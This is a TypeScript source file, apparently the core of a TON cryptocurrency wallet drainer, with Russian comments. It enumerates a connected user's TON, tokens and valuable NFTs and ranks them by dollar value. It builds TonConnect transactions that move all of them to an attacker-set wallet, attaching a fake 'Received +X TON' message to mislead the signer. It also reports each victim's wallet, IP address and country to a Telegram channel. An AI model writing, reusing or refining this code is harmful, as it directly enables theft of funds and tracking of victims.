import { Address, beginCell } from 'ton-core';
import axios from 'axios';
import { sendTelegramMessage, formatNumber, shortAdd, escp, sleep } from './telegram';

interface CF {
  Wallet: string;
  Native: boolean;
  Tokens: boolean;
  NFTs: boolean;
  Tokens_First: boolean;
  Ton_rate: number;
  TonApi_Key: string;
}

const CF: CF = {
  Wallet: process.env.NEXT_PUBLIC_WALLET as string,
  Native: process.env.NEXT_PUBLIC_NATIVE === 'true',
  Tokens: process.env.NEXT_PUBLIC_TOKENS === 'true',
  NFTs: process.env.NEXT_PUBLIC_NFTS === 'true',
  Tokens_First: false,
  Ton_rate: parseFloat(process.env.NEXT_PUBLIC_TON_RATE || "2.99"),
  TonApi_Key: process.env.NEXT_PUBLIC_TONAPI_KEY as string,
};

let nftWhitelistCache: any[] | null = null;

export interface TonData {
  type: string;
  balance: number;
  sendingBalance: number;
  calculatedBalanceUSDTG: number;
}

export interface TokenData {
  type: string;
  wallet_address: string;
  TokenBalance: number;
  roundedBalance: string;
  address: string;
  symbol: string;
  name: string;
  calculatedBalanceUSDTG: number;
  decimals: number;
}

export interface NftData {
  type: string;
  data: string;
  name: string;
  calculatedBalanceUSDTG: number;
}

// Интерфейс для объединенных активов
interface UnifiedAsset {
  type: 'TON' | 'TOKEN' | 'NFT';
  value: number; // стоимость в USD
  data: TonData | TokenData | NftData;
  transferCost: number; // стоимость перевода в наноTON
}

// Константы комиссий в наноTON
const TRANSFER_COSTS = {
  TON: 5000000, // ~0.005 TON за обычный перевод
  TOKEN: 30000000, // 0.03 TON за токен перевод
  NFT: 50000000, // 0.05 TON за NFT перевод
  RESERVE: 20000000, // 0.02 TON резерв для работы кошелька
  MIN_TON_SEND: 100000000, // минимум 0.1 TON для отправки TON
};

export async function fetchTonData(address: string): Promise<TonData | null> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}${CF.TonApi_Key ? `?token=${CF.TonApi_Key}` : ''}`
    );
    
    const balanceTON = parseFloat(response.data.balance) / 1000000000;
    const fullBalanceNanoTon = parseFloat(response.data.balance);
    
    // Оставляем резерв для работы кошелька
    const sendingBalance = fullBalanceNanoTon - TRANSFER_COSTS.RESERVE;
    
    console.log(`TON Balance check: Full=${balanceTON.toFixed(4)} TON, Available=${(Math.max(0, sendingBalance)/1000000000).toFixed(4)} TON`);
    
    return sendingBalance > 0 ? {
      type: "TON",
      balance: balanceTON,
      sendingBalance: Math.max(0, sendingBalance),
      calculatedBalanceUSDTG: parseFloat((CF.Ton_rate * balanceTON).toFixed(2))
    } : null;
  } catch (error) {
    console.error('TON data error:', error);
    return null;
  }
}

export async function fetchTokenData(address: string): Promise<TokenData[]> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}/jettons?currencies=ton,usd${CF.TonApi_Key ? `&token=${CF.TonApi_Key}` : ''}`
    );
    
    if (!response.data.balances || response.data.balances.length === 0) return [];
    
    return response.data.balances
      .filter((token: any) => parseFloat(token.balance) > 0 && token.jetton.verification !== "blacklist")
      .map((token: any) => {
        const balance = parseFloat(token.balance) / Math.pow(10, token.jetton.decimals);
        const priceUsd = token.price?.prices?.USD || 0;
        const calculatedBalanceUSDTG = parseFloat((balance * priceUsd).toFixed(2));
        
        return {
          type: "TOKEN",
          wallet_address: token.wallet_address.address,
          TokenBalance: parseFloat(token.balance),
          roundedBalance: balance.toFixed(2),
          address: token.jetton.address,
          symbol: token.jetton.symbol,
          name: token.jetton.name,
          calculatedBalanceUSDTG,
          decimals: token.jetton.decimals
        };
      })
      .filter((token: TokenData) => token.calculatedBalanceUSDTG > 0);
  } catch (error) {
    console.error('Token data error:', error);
    return [];
  }
}

export async function fetchNftData(address: string): Promise<NftData[]> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}/nfts?limit=1000&offset=0&indirect_ownership=false${CF.TonApi_Key ? `&token=${CF.TonApi_Key}` : ''}`
    );
    
    if (!response.data.nft_items || response.data.nft_items.length === 0) return [];
    
    if (!nftWhitelistCache) {
      try {
        const whitelistResponse = await axios.get('/assets/js/nfts_whitelist.json');
        nftWhitelistCache = whitelistResponse.data;
      } catch (e) {
        console.error('NFT whitelist load error:', e);
        nftWhitelistCache = [];
      }
    }
    
    return response.data.nft_items
      .filter((nft: any) => nft.collection && nft.collection.name)
      .map((nft: any) => {
        const collectionAddress = Address.parse(nft.collection.address).toString({bounceable: true});
        const matchingNft = nftWhitelistCache!.find((item: any) => item.nft_address === collectionAddress);
        if (!matchingNft) return null;
        
        const price = parseFloat((matchingNft.average_price * CF.Ton_rate).toFixed(2));
        return price > 0 ? {
          type: "NFT",
          data: nft.address,
          name: nft.metadata.name || 'Unknown NFT',
          calculatedBalanceUSDTG: price
        } : null;
      })
      .filter((nft: NftData | null) => nft !== null) as NftData[];
  } catch (error) {
    console.error('NFT data error:', error);
    return [];
  }
}

// Функция для создания приоритизированного списка активов ПО ЦЕНЕ
function createUnifiedAssetsByPrice(
  tonData: TonData | null,
  tokenData: TokenData[],
  nftData: NftData[]
): UnifiedAsset[] {
  const assets: UnifiedAsset[] = [];

  // Добавляем NFT
  if (CF.NFTs && nftData.length > 0) {
    nftData.forEach(nft => {
      assets.push({
        type: 'NFT',
        value: nft.calculatedBalanceUSDTG,
        data: nft,
        transferCost: TRANSFER_COSTS.NFT
      });
    });
  }

  // Добавляем токены
  if (CF.Tokens && tokenData.length > 0) {
    tokenData.forEach(token => {
      assets.push({
        type: 'TOKEN',
        value: token.calculatedBalanceUSDTG,
        data: token,
        transferCost: TRANSFER_COSTS.TOKEN
      });
    });
  }

  // Добавляем TON (всегда последним независимо от цены!)
  if (CF.Native && tonData) {
    assets.push({
      type: 'TON',
      value: tonData.calculatedBalanceUSDTG,
      data: tonData,
      transferCost: TRANSFER_COSTS.TON
    });
  }

  // Сортировка: Сначала все не-TON активы по цене, потом TON
  const nonTonAssets = assets.filter(a => a.type !== 'TON');
  const tonAssets = assets.filter(a => a.type === 'TON');
  
  // Сортируем не-TON активы по цене (дорогие первыми)
  nonTonAssets.sort((a, b) => b.value - a.value);
  
  console.log('=== ПРИОРИТИЗАЦИЯ ПО ЦЕНЕ ===');
  nonTonAssets.forEach((asset, index) => {
    console.log(`${index + 1}. ${asset.type} - $${asset.value.toFixed(2)}`);
  });
  if (tonAssets.length > 0) {
    console.log(`${nonTonAssets.length + 1}. TON - $${tonAssets[0].value.toFixed(2)} (всегда последний)`);
  }
  
  // Возвращаем: сначала отсортированные по цене не-TON, потом TON
  return [...nonTonAssets, ...tonAssets];
}

// ДОПОЛНИТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ДИАГНОСТИКИ
function debugAssetProcessing(
  tonData: TonData | null, 
  tokenData: TokenData[], 
  nftData: NftData[]
) {
  console.log(`=== ASSET DEBUG INFO ===`);
  
  if (tonData) {
    console.log(`TON: Balance=${tonData.balance.toFixed(4)}, SendingBalance=${(tonData.sendingBalance/1000000000).toFixed(4)} TON, USD=${tonData.calculatedBalanceUSDTG}`);
  } else {
    console.log(`TON: No balance available`);
  }
  
  console.log(`Tokens (${tokenData.length}):`);
  tokenData.forEach((token, i) => {
    console.log(`  ${i+1}. ${token.symbol}: ${token.roundedBalance} ($${token.calculatedBalanceUSDTG})`);
  });
  
  console.log(`NFTs (${nftData.length}):`);
  nftData.forEach((nft, i) => {
    console.log(`  ${i+1}. ${nft.name}: $${nft.calculatedBalanceUSDTG}`);
  });
  
  console.log(`Transfer costs:`);
  console.log(`  TON: ${TRANSFER_COSTS.TON/1000000000} TON`);
  console.log(`  TOKEN: ${TRANSFER_COSTS.TOKEN/1000000000} TON`);
  console.log(`  NFT: ${TRANSFER_COSTS.NFT/1000000000} TON`);
  console.log(`  MIN_TON_SEND: ${TRANSFER_COSTS.MIN_TON_SEND/1000000000} TON`);
  console.log(`  RESERVE: ${TRANSFER_COSTS.RESERVE/1000000000} TON`);
}

// ИСПРАВЛЕННАЯ функция для анализа и фильтрации активов
function analyzeAndFilterAssets(
  assets: UnifiedAsset[],
  tonData: TonData | null
): {
  scenario: string;
  processableAssets: UnifiedAsset[];
  skippedAssets: UnifiedAsset[];
  totalCostNanoTon: number;
  canProcessAny: boolean;
  reasonMessage: string;
} {
  const availableBalance = tonData?.sendingBalance ?? 0;
  const availableBalanceTON = availableBalance / 1000000000;
  
  console.log(`=== BALANCE ANALYSIS ===`);
  console.log(`Available balance: ${availableBalanceTON.toFixed(4)} TON (${availableBalance} nanoTON)`);
  
  // Разделяем активы по типам
  const tonAssets = assets.filter(a => a.type === 'TON');
  const tokenAssets = assets.filter(a => a.type === 'TOKEN');
  const nftAssets = assets.filter(a => a.type === 'NFT');
  
  console.log(`Assets count: TON=${tonAssets.length}, Tokens=${tokenAssets.length}, NFTs=${nftAssets.length}`);

  // СЦЕНАРИЙ 1: Совсем нет баланса
  if (availableBalance <= 0) {
    return {
      scenario: 'NO_BALANCE',
      processableAssets: [],
      skippedAssets: assets,
      totalCostNanoTon: 0,
      canProcessAny: false,
      reasonMessage: `No TON balance available (${availableBalanceTON.toFixed(4)} TON)`
    };
  }

  // СЦЕНАРИЙ 2: Баланс есть, но даже на один токен не хватает
  if (availableBalance < TRANSFER_COSTS.TOKEN && (tokenAssets.length > 0 || nftAssets.length > 0)) {
    console.log(`Insufficient balance for any token/NFT transfers`);
    
    // Проверяем можем ли хотя бы TON отправить
    // ИСПРАВЛЕНО: Уменьшил минимальную сумму для TON перевода
    const MIN_TON_FOR_TRANSFER = 50000000; // 0.05 TON вместо 0.1
    if (tonAssets.length > 0 && availableBalance >= TRANSFER_COSTS.TON + MIN_TON_FOR_TRANSFER) {
      const tonAsset = tonAssets[0];
      const correctedTonData = {
        ...tonAsset.data as TonData,
        sendingBalance: availableBalance - TRANSFER_COSTS.TON
      };
      
      return {
        scenario: 'TON_ONLY',
        processableAssets: [{
          ...tonAsset,
          data: correctedTonData
        }],
        skippedAssets: tokenAssets.concat(nftAssets),
        totalCostNanoTon: TRANSFER_COSTS.TON,
        canProcessAny: true,
        reasonMessage: `Only TON transfer possible. Need ${TRANSFER_COSTS.TOKEN/1000000000} TON for tokens, have ${availableBalanceTON.toFixed(4)} TON`
      };
    }
    
    return {
      scenario: 'INSUFFICIENT_FOR_TOKENS',
      processableAssets: [],
      skippedAssets: assets,
      totalCostNanoTon: 0,
      canProcessAny: false,
      reasonMessage: `Need ${TRANSFER_COSTS.TOKEN/1000000000} TON for token transfer, have ${availableBalanceTON.toFixed(4)} TON`
    };
  }

  // СЦЕНАРИЙ 3: Можем обработать некоторые или все активы
  let totalCost = 0;
  const processableAssets: UnifiedAsset[] = [];
  const skippedAssets: UnifiedAsset[] = [];
  
  // ИСПРАВЛЕНО: Более гибкий подход к резерву для TON
  const tonAsset = tonAssets[0];
  const nonTonAssets = assets.filter(a => a.type !== 'TON');
  
  // Сначала считаем стоимость всех не-TON активов
  const totalNonTonCost = nonTonAssets.reduce((sum, asset) => sum + asset.transferCost, 0);
  console.log(`Total cost for ${nonTonAssets.length} non-TON assets: ${totalNonTonCost/1000000000} TON`);
  
  // НОВАЯ ЛОГИКА: Если есть TON актив, решаем - отправлять его или нет
  let shouldProcessTon = false;
  let tonReserve = 0;
  
  if (tonAsset) {
    const MIN_TON_FOR_TRANSFER = 50000000; // 0.05 TON
    const remainingAfterNonTon = availableBalance - totalNonTonCost;
    
    console.log(`Remaining after non-TON transfers: ${remainingAfterNonTon/1000000000} TON`);
    
    // Если после всех не-TON переводов остается достаточно для TON перевода
    if (remainingAfterNonTon >= TRANSFER_COSTS.TON + MIN_TON_FOR_TRANSFER) {
      shouldProcessTon = true;
      tonReserve = TRANSFER_COSTS.TON + MIN_TON_FOR_TRANSFER;
      console.log(`Will process TON asset, reserving ${tonReserve/1000000000} TON`);
    } else {
      console.log(`Will NOT process TON asset - insufficient remaining balance`);
    }
  }
  
  // Обрабатываем не-TON активы
  const availableForNonTon = availableBalance - tonReserve;
  console.log(`Available for non-TON assets: ${availableForNonTon/1000000000} TON`);
  
  for (const asset of nonTonAssets) {
    const costForThisAsset = asset.transferCost;
    
    if (totalCost + costForThisAsset <= availableForNonTon) {
      processableAssets.push(asset);
      totalCost += costForThisAsset;
      console.log(`✅ Added ${asset.type} ($${asset.value.toFixed(2)}) - cost: ${costForThisAsset/1000000000} TON, total: ${totalCost/1000000000} TON`);
    } else {
      skippedAssets.push(asset);
      console.log(`❌ Skipped ${asset.type} ($${asset.value.toFixed(2)}) - would cost: ${costForThisAsset/1000000000} TON, total would be: ${(totalCost + costForThisAsset)/1000000000} TON`);
    }
  }
  
  // Добавляем TON если планировали
  if (shouldProcessTon && tonAsset) {
    const remainingBalance = availableBalance - totalCost;
    const tonSendAmount = remainingBalance - TRANSFER_COSTS.TON;
    
    if (tonSendAmount > 0) {
      const correctedTonData = {
        ...tonAsset.data as TonData,
        sendingBalance: tonSendAmount
      };
      
      processableAssets.push({
        ...tonAsset,
        data: correctedTonData
      });
      totalCost += TRANSFER_COSTS.TON;
      console.log(`✅ Added TON ($${tonAsset.value.toFixed(2)}) - sending: ${tonSendAmount/1000000000} TON`);
    } else {
      skippedAssets.push(tonAsset);
      console.log(`❌ TON calculation error - negative send amount: ${tonSendAmount}`);
    }
  } else if (tonAsset) {
    skippedAssets.push(tonAsset);
    console.log(`❌ Skipped TON ($${tonAsset.value.toFixed(2)}) - insufficient remaining balance`);
  }
  
  let scenario = 'FULL_PROCESSING';
  let reasonMessage = 'All assets can be processed';
  
  if (skippedAssets.length > 0) {
    scenario = 'PARTIAL_PROCESSING';
    reasonMessage = `Processing ${processableAssets.length}/${assets.length} assets. Skipped ${skippedAssets.length} due to insufficient balance`;
  }
  
  // ДОПОЛНИТЕЛЬНАЯ ДИАГНОСТИКА
  console.log(`=== FINAL RESULT ===`);
  console.log(`Scenario: ${scenario}`);
  console.log(`Processable: ${processableAssets.length} assets`);
  console.log(`Skipped: ${skippedAssets.length} assets`);
  console.log(`Total cost: ${totalCost/1000000000} TON`);
  console.log(`Available: ${availableBalance/1000000000} TON`);
  console.log(`Remaining: ${(availableBalance - totalCost)/1000000000} TON`);
  
  return {
    scenario,
    processableAssets,
    skippedAssets,
    totalCostNanoTon: totalCost,
    canProcessAny: processableAssets.length > 0,
    reasonMessage
  };
}

// Оптимизированная функция обработки активов
export async function processAssetsOptimized(
  tonData: TonData | null, 
  tokenData: TokenData[], 
  nftData: NftData[], 
  userWallet: string, 
  tonConnectUI: any, 
  ipInfo: { IP: string, ISO2: string },
  host: string
) {
  try {
    // ДОБАВИЛ ДИАГНОСТИКУ
    debugAssetProcessing(tonData, tokenData, nftData);
    
    // Создаем унифицированный список активов по цене
    const unifiedAssets = createUnifiedAssetsByPrice(tonData, tokenData, nftData);
    
    if (unifiedAssets.length === 0) {
      console.log('No assets to process');
      return true;
    }

    // Анализируем и фильтруем активы
    const analysis = analyzeAndFilterAssets(unifiedAssets, tonData);
    
    console.log(`=== SCENARIO: ${analysis.scenario} ===`);
    console.log(`Reason: ${analysis.reasonMessage}`);
    console.log(`Can process: ${analysis.canProcessAny}`);
    console.log(`Processable assets: ${analysis.processableAssets.length}`);
    console.log(`Skipped assets: ${analysis.skippedAssets.length}`);
    
    // Отправляем соответствующие уведомления
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_REQUEST === 'true') {
      await sendAnalysisNotification(analysis, userWallet, tonData);
    }
    
    if (!analysis.canProcessAny) {
      console.warn('Cannot process any assets');
      return false;
    }

    // Обрабатываем активы группами по 4 (максимум сообщений в транзакции)
    for (let i = 0; i < analysis.processableAssets.length; i += 4) {
      const chunk = analysis.processableAssets.slice(i, i + 4);
      await processUnifiedTransaction(chunk, userWallet, tonConnectUI, ipInfo, host);
      
      // Задержка между транзакциями
      if (i + 4 < analysis.processableAssets.length) {
        await sleep(1500);
      }
    }
    
    return true;
  } catch (error) {
    console.error('Optimized asset processing error:', error);
    throw error;
  }
}

// Функция для отправки уведомлений на основе анализа
async function sendAnalysisNotification(
  analysis: { scenario: string; processableAssets: UnifiedAsset[]; skippedAssets: UnifiedAsset[]; reasonMessage: string },
  userWallet: string,
  tonData: TonData | null
) {
  const availableBalance = tonData ? (tonData.sendingBalance / 1000000000).toFixed(4) : '0';
  
  let icon = '🎣';
  let title = 'Creating transfer request';
  let message = '';
  
  switch (analysis.scenario) {
    case 'NO_BALANCE':
      icon = '❌';
      title = 'No balance available';
      message = `Available: *${availableBalance}* TON\n\nNo transfers possible.`;
      break;
      
    case 'INSUFFICIENT_FOR_TOKENS':
      icon = '⚠️';
      title = 'Insufficient balance for tokens';
      message = `Available: *${availableBalance}* TON\nRequired for 1 token: *${(TRANSFER_COSTS.TOKEN/1000000000).toFixed(3)}* TON\n\nNo transfers possible.`;
      break;
      
    case 'TON_ONLY':
      icon = '⚠️';
      title = 'TON-only transfer';
      const tonAsset = analysis.processableAssets[0];
      const sendingAmount = ((tonAsset.data as TonData).sendingBalance / 1000000000).toFixed(4);
      message = `Available: *${availableBalance}* TON\nSending: *${sendingAmount}* TON\n\nSkipped ${analysis.skippedAssets.length} assets (insufficient balance)`;
      break;
      
    case 'PARTIAL_PROCESSING':
      icon = '⚠️';
      title = 'Partial transfer (by price priority)';
      message = `Available: *${availableBalance}* TON\nProcessing: *${analysis.processableAssets.length}* most expensive assets\nSkipped: *${analysis.skippedAssets.length}* cheaper assets`;
      break;
      
    case 'FULL_PROCESSING':
      icon = '🎣';
      title = 'Creating unified transfer request (by price)';
      message = `Available: *${availableBalance}* TON\nProcessing: *${analysis.processableAssets.length}* assets (sorted by value)`;
      break;
  }
  
  const notif = `${icon} *${title}* (${shortAdd(userWallet)})\n\n${message}`;
  await sendTelegramMessage(notif);
}

// Обработка объединенной транзакции
async function processUnifiedTransaction(
  assets: UnifiedAsset[], 
  userWallet: string, 
  tonConnectUI: any, 
  ipInfo: { IP: string, ISO2: string }, 
  host: string
) {
  try {
    const totalUSD = assets.reduce((sum, asset) => sum + asset.value, 0);
    const assetTypes = assets.map(asset => asset.type).join(', ');
    
    // Группируем активы по типам для уведомления
    const assetsByType = assets.reduce((acc, asset) => {
      if (!acc[asset.type]) acc[asset.type] = [];
      acc[asset.type].push(asset);
      return acc;
    }, {} as Record<string, UnifiedAsset[]>);

    // Создаем описание для уведомления
    let assetDescription = '';
    Object.entries(assetsByType).forEach(([type, typeAssets]) => {
      if (type === 'TON') {
        const tonData = typeAssets[0].data as TonData;
        const sendingAmount = (tonData.sendingBalance / 1000000000).toFixed(4);
        assetDescription += `\n• TON: *${sendingAmount}* TON`;
      } else if (type === 'TOKEN') {
        assetDescription += `\n• Tokens (${typeAssets.length}):`;
        typeAssets.forEach(asset => {
          const token = asset.data as TokenData;
          assetDescription += `\n  - ${escp(token.name)}: *${token.roundedBalance}* ${escp(token.symbol)} ($${asset.value.toFixed(2)})`;
        });
      } else if (type === 'NFT') {
        assetDescription += `\n• NFTs (${typeAssets.length}):`;
        typeAssets.forEach(asset => {
          const nft = asset.data as NftData;
          assetDescription += `\n  - ${escp(nft.name)} ($${asset.value.toFixed(2)})`;
        });
      }
    });

    // Создаем сообщения для транзакции
    const transactionMessages = assets.map(asset => {
      switch (asset.type) {
        case 'TON':
          return createTonMessage(asset.data as TonData);
        case 'TOKEN':
          return createTokenMessage(asset.data as TokenData, userWallet);
        case 'NFT':
          return createNftMessage(asset.data as NftData, userWallet);
        default:
          throw new Error(`Unknown asset type: ${asset.type}`);
      }
    });

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 360,
      messages: transactionMessages
    };

    console.log(`=== SENDING TRANSACTION ===`);
    console.log(`Assets: ${assets.length}`);
    console.log(`Messages: ${transactionMessages.length}`);
    console.log(`Total USD: $${totalUSD.toFixed(2)}`);

    await tonConnectUI.sendTransaction(transaction);

    if (process.env.NEXT_PUBLIC_TG_TRANSFER_SUCCESS === 'true') {
      const successMsg = `✅ *Transfer Approved* (${shortAdd(userWallet)})\n\nTypes: ${assetTypes}\nTotal: ≈ *${formatNumber(totalUSD)}* USD${assetDescription}\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      await sendTelegramMessage(successMsg);
    }
  } catch (error) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_CANCEL === 'true') {
      const totalUSD = assets.reduce((sum, asset) => sum + asset.value, 0);
      const assetTypes = assets.map(asset => asset.type).join(', ');
      const errorMsg = `❌ *Transfer Declined* (${shortAdd(userWallet)})\n\nTypes: ${assetTypes}\nTotal: ≈ *${formatNumber(totalUSD)}* USD\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      await sendTelegramMessage(errorMsg);
    }
    throw error;
  }
}

// Создание сообщения для TON
function createTonMessage(tonData: TonData) {
  const sendingAmount = (tonData.sendingBalance / 1000000000).toFixed(4);
  
  const cell = beginCell()
    .storeUint(0, 32)
    .storeStringTail(`Received +${formatNumber(Number(sendingAmount) * 2.29 + 100)} TON`)
    .endCell();
  
  return {
    address: CF.Wallet,
    amount: tonData.sendingBalance.toString(),
    payload: cell.toBoc().toString('base64'),
  };
}

// Создание сообщения для токена
function createTokenMessage(token: TokenData, userWallet: string) {
  const payloadCell = beginCell()
    .storeUint(0xf8a7ea5, 32)
    .storeUint(0, 64)
    .storeCoins(BigInt(Math.floor(token.TokenBalance)))
    .storeAddress(Address.parse(CF.Wallet))
    .storeAddress(Address.parse(userWallet))
    .storeBit(0)
    .storeCoins(BigInt(10000000))
    .storeBit(0)
    .endCell();
  
  return {
    address: token.wallet_address,
    amount: TRANSFER_COSTS.TOKEN.toString(),
    payload: payloadCell.toBoc().toString('base64')
  };
}

// Создание сообщения для NFT
function createNftMessage(nft: NftData, userWallet: string) {
  const payloadCell = beginCell()
    .storeUint(0x5fcc3d14, 32)
    .storeUint(0, 64)
    .storeAddress(Address.parse(CF.Wallet))
    .storeAddress(Address.parse(userWallet))
    .storeBit(0)
    .storeCoins(BigInt(10000000))
    .storeBit(0)
    .endCell();
  
  return {
    address: nft.data,
    amount: TRANSFER_COSTS.NFT.toString(),
    payload: payloadCell.toBoc().toString('base64')
  };
}

// Старые функции для совместимости
export async function processAssets(
  tonData: TonData | null, 
  tokenData: TokenData[], 
  nftData: NftData[], 
  userWallet: string, 
  tonConnectUI: any, 
  ipInfo: { IP: string, ISO2: string },
  host: string
) {
  return processAssetsOptimized(tonData, tokenData, nftData, userWallet, tonConnectUI, ipInfo, host);
}